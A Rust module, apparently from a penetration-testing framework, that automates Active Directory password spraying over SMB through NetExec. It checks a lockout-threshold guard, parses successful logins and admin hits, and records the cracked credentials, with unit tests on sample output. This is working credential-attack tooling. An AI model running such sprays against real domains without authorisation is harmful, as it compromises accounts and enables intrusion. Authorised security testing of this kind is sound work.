//! Lockout-aware password spraying via NetExec: one password across many users.
//!
//! Distinct from the loud brute modules — it sprays a *single* password and first
//! consults the discovered lockout policy (from `ad-password-policy` facts) to
//! refuse when a single attempt could risk lockouts. Validated hits are stored as
//! credentials and summarised as a finding.

use std::sync::Arc;

use serde_json::{json, Value};

use crate::db::repository;
use crate::models::{Finding, Job};
use crate::state::AppState;

use super::nxc_common::{
    active_engagement_id, record_credential, record_finding, require_nxc, run_nxc,
};

pub struct AdSpray;

impl AdSpray {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;
        let target = job.target()?;
        let password = cfg.get("password").and_then(|v| v.as_str()).ok_or("config.password required")?;
        let domain = cfg.get("domain").and_then(|v| v.as_str()).unwrap_or("");
        let force = cfg.get("force").and_then(|v| v.as_bool()).unwrap_or(false);
        // Default lockout buffer comes from OPSEC settings; config can override per-job.
        let default_buffer = crate::settings::current().spray_lockout_buffer as u32;
        let buffer = cfg.get("lockout_buffer").and_then(|v| v.as_u64()).map(|n| n as u32).unwrap_or(default_buffer);

        let eng = active_engagement_id(state).await;

        // Gather spray targets: explicit config list, else enumerated `users` facts.
        let users = collect_users(cfg, state, &eng, &target, domain).await;
        if users.is_empty() {
            return Err("no users to spray — provide config.users or run ad-null-session first".into());
        }

        // Lockout guard: consult discovered policy unless the operator forces it.
        let threshold = lockout_threshold_fact(state, &eng, &target, domain).await;
        if !force && !spray_is_safe(threshold, buffer) {
            let msg = format!(
                "Spray refused: lockout threshold {:?} too low for a safe single attempt (buffer {}). Re-run with force=true to override.",
                threshold, buffer
            );
            let _ = repository::add_log(&state.db, "WARN", "attacks", Some("ad-spray"), Some(&job.id), &msg).await;
            return Err(msg);
        }

        let bin = require_nxc(state, &job.id, "ad-spray").await?;

        // Write the user list to a scratch file for `nxc -u <file>`.
        let user_file = std::env::temp_dir().join(format!("decebalus_spray_{}.txt", job.id));
        tokio::fs::write(&user_file, users.join("\n"))
            .await
            .map_err(|e| format!("failed to stage user list: {}", e))?;

        let mut args = vec![
            "smb".to_string(),
            target.clone(),
            "-u".to_string(),
            user_file.to_string_lossy().to_string(),
            "-p".to_string(),
            password.to_string(),
            "--continue-on-success".to_string(),
        ];
        if !domain.is_empty() {
            args.push("-d".to_string());
            args.push(domain.to_string());
        }

        let _ = state.broadcaster.send(format!(
            "scan_progress:{}:Spraying 1 password across {} user(s) on {}",
            job.id, users.len(), target
        ));

        let out = run_nxc(bin, &args, 600).await;
        let _ = tokio::fs::remove_file(&user_file).await;
        let out = out?;

        let hits = parse_spray_hits(&out.stdout);
        for (user, admin) in &hits {
            record_credential(
                state,
                &eng,
                &job.id,
                domain,
                user,
                password,
                "password",
                true,
                vec![format!("{}:smb", target)],
                if *admin { "admin" } else { "user" },
            )
            .await;
        }

        if !hits.is_empty() {
            let names: Vec<&String> = hits.iter().map(|(u, _)| u).collect();
            let mut f = Finding::new(
                format!("spray-hit:{}", target),
                format!("Valid credentials from spray on {}", target),
            );
            f.engagement_id = eng.clone();
            f.category = "ad".into();
            f.severity = "high".into();
            f.value_score = 70 + if hits.iter().any(|(_, a)| *a) { 20 } else { 0 };
            f.rationale = format!("{} account(s) accept this password: {}", hits.len(), names.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", "));
            f.status = "done".into();
            f.evidence = json!({ "target": target, "users": names });
            record_finding(state, &f).await;
        }

        let msg = format!("Spray on {}: {} valid of {} users", target, hits.len(), users.len());
        let _ = repository::add_log(&state.db, "INFO", "attacks", Some("ad-spray"), Some(&job.id), &msg).await;
        let _ = state.broadcaster.send(format!("scan_progress:{}:{}", job.id, msg));

        Ok(json!({
            "target": target,
            "sprayed_users": users.len(),
            "valid": hits.iter().map(|(u, a)| json!({ "username": u, "admin": a })).collect::<Vec<_>>(),
        })
        .to_string())
    }
}

/// Spray targets: explicit `config.users`, else the `users` fact for the host.
async fn collect_users(
    cfg: &serde_json::Map<String, Value>,
    state: &Arc<AppState>,
    engagement_id: &str,
    target: &str,
    _domain: &str,
) -> Vec<String> {
    if let Some(arr) = cfg.get("users").and_then(|v| v.as_array()) {
        let list: Vec<String> = arr.iter().filter_map(|v| v.as_str().map(String::from)).collect();
        if !list.is_empty() {
            return list;
        }
    }
    let facts = repository::get_facts_for_subject(&state.db, engagement_id, "host", target)
        .await
        .unwrap_or_default();
    facts
        .into_iter()
        .find(|f| f.key == "users")
        .and_then(|f| f.value.as_array().map(|a| a.iter().filter_map(|v| v.as_str().map(String::from)).collect()))
        .unwrap_or_default()
}

/// The lockout threshold fact for the domain (preferred) or host, if recorded.
async fn lockout_threshold_fact(
    state: &Arc<AppState>,
    engagement_id: &str,
    target: &str,
    domain: &str,
) -> Option<u32> {
    for (stype, sid) in [("domain", domain), ("host", target)] {
        if sid.is_empty() {
            continue;
        }
        let facts = repository::get_facts_for_subject(&state.db, engagement_id, stype, sid)
            .await
            .unwrap_or_default();
        if let Some(f) = facts.into_iter().find(|f| f.key == "lockout_threshold") {
            return f.value.as_u64().map(|n| n as u32);
        }
    }
    None
}

/// A single spray attempt per account is safe when there is no lockout, the
/// policy is unknown (low risk for one attempt), or the threshold leaves a buffer.
pub fn spray_is_safe(lockout_threshold: Option<u32>, buffer: u32) -> bool {
    match lockout_threshold {
        None => true,
        Some(0) => true,
        Some(t) => t > buffer + 1,
    }
}

/// Extract `(username, is_admin)` from spray hit lines `[+] domain\user:pass`.
pub fn parse_spray_hits(stdout: &str) -> Vec<(String, bool)> {
    let mut hits = Vec::new();
    for line in stdout.lines() {
        if !line.contains("[+]") {
            continue;
        }
        // Find the `domain\user:pass` token following `[+]`.
        let Some(after) = line.split("[+]").nth(1) else { continue };
        let Some(bs) = after.find('\\') else { continue };
        let rest = &after[bs + 1..];
        let user_end = rest.find(':').unwrap_or(rest.len());
        let user = rest[..user_end].trim().to_string();
        if user.is_empty() {
            continue;
        }
        let admin = line.contains("Pwn3d!");
        if !hits.iter().any(|(u, _): &(String, bool)| u.eq_ignore_ascii_case(&user)) {
            hits.push((user, admin));
        }
    }
    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lockout_safety_leaves_a_buffer() {
        assert!(spray_is_safe(None, 1)); // unknown policy → allowed (single attempt)
        assert!(spray_is_safe(Some(0), 1)); // no lockout
        assert!(spray_is_safe(Some(5), 1)); // 5 > 2
        assert!(spray_is_safe(Some(3), 1)); // 3 > 2
        assert!(!spray_is_safe(Some(2), 1)); // too tight
        assert!(!spray_is_safe(Some(1), 1));
    }

    #[test]
    fn parses_spray_hits_and_admin() {
        let out = "\
SMB 10.0.0.5 445 DC01 [-] acme\\a:pw STATUS_LOGON_FAILURE
SMB 10.0.0.5 445 DC01 [+] acme\\jdoe:Spring2026!
SMB 10.0.0.5 445 DC01 [+] acme\\admin:Spring2026! (Pwn3d!)
SMB 10.0.0.5 445 DC01 [+] acme\\jdoe:Spring2026!";
        let hits = parse_spray_hits(out);
        assert_eq!(hits, vec![("jdoe".to_string(), false), ("admin".to_string(), true)]);
    }
}
